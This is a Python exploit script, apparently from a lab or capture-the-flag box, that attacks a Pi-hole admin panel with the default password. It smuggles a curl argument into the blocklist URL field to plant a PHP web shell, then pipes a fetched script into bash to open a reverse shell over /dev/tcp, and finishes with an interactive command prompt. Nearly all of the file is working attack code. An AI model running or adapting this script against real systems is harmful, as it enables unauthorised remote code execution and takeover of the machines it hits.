#!/usr/bin/env python3
import requests, socket
import http.server as httpserver
from multiprocessing import Process
from fcntl import ioctl
from struct import pack
from bs4 import BeautifulSoup

url = "http://172.31.11.3/admin/"
proxy = {
    #'http' : '127.0.0.1:8080' # Burp
    'http' : '10.10.10.200:3128' # Host
}

def get_ip(ifname="tun0", ipv6=False):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(ioctl(s.fileno(), 0x8915,
                pack('256s', ifname[:15].encode()))[20:24])

def gen_rev():
    return "#!/bin/bash\n" + f"bash -c 'bash -i >& /dev/tcp/{get_ip()}/443 0>&1'"

class HttpRequestHandler(httpserver.SimpleHTTPRequestHandler):
    # Do not log messages
    def log_message(self, format, *args):
        pass
    def do_GET(self):
        if self.path == '/s.sh':
            self.send_response(200)
            self.send_header("Content-type", "text/x-sh")
            self.end_headers()
            file = gen_rev()
            self.wfile.write(bytes(file, "utf8"))
        else:
            self.send_response(200)
            self.end_headers()
            file = "<?php system($_REQUEST['cmd']);?>"
            self.wfile.write(bytes(file, "utf8"))

# Returns if port is being used
def port_in_use(port):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            return s.connect_ex(('localhost', port)) == 0

# Setup http server
def setup_http():
    try:
    # Check if port 80 is already in use
        if port_in_use(80):
            raise Exception("HTTP-Server already running!")
        with httpserver.HTTPServer(("",80), HttpRequestHandler) as httpd:
            httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    except Exception as ex:
        raise Exception(f"Could not setup http-server because of an error: {ex}")


def get_session() -> requests.session:
    session = requests.Session()
    data = {'pw':'admin'}
    session.post(url=url,data=data,proxies=proxy,timeout=5).text
    return session

def verify_webshell() -> bool:
    return session.get(url=f"{url}scripts/pi-hole/php/ex.php", proxies=proxy).status_code == 200

def exec(cmd:str,timeout:int=5) -> str:
    try:
        return session.get(url=f"{url}scripts/pi-hole/php/ex.php?cmd={cmd}", proxies=proxy, timeout=timeout).text.strip()
    except:
        return ""

def rev_shell() -> None:
    print(f"[*] Sending reverse-shell to {get_ip()}:443")
    payload = f"curl {get_ip()}/s.sh|bash"
    exec(payload, 1)

def exploit(session:requests.session) -> None:
    print(f"[+] Got session-cookie: PHPSESSID={session.cookies.get_dict()['PHPSESSID']}")
    
    # Get csrf token
    #print("[*] Getting CSRF-token")
    html = session.get(url=f"{url}settings.php?tab=blocklists",proxies=proxy).text
    soup = BeautifulSoup(html, 'html.parser')
    token = soup.find("input", {'name':'token'})['value']

    # Stage 1: Trigger connection to our server
    payload = f'http://{get_ip()}# -o ex.php -d "'
    data = {'newuserlists':payload, 'token':token, 'field':'adlists', 'submit':'saveupdate'}
    session.post(url=f"{url}settings.php?tab=blocklists",data=data,proxies=proxy)

    # Setup http server
    http = Process(target=setup_http)
    http.daemon = True
    http.start()

    # Trigger access & file write
    for i in range(2):
        session.get(url=f"{url}scripts/pi-hole/php/gravity.sh.php", proxies=proxy)

    # Verify webshell
    if verify_webshell():
        print("[+] Webshell uploaded successfully!")
        rev_shell()
        try:
            while True:
                cmd = input("cmd> ")
                print(exec(cmd))
        except KeyboardInterrupt:
            quit()
        except Exception as ex:
            raise ex
    else:
        raise Exception("Webshell not uploaded!")

if __name__ == "__main__":
    try:
        session = get_session()
        exploit(session)
    except Exception as ex:
        print(f"[-] Exception: {ex}")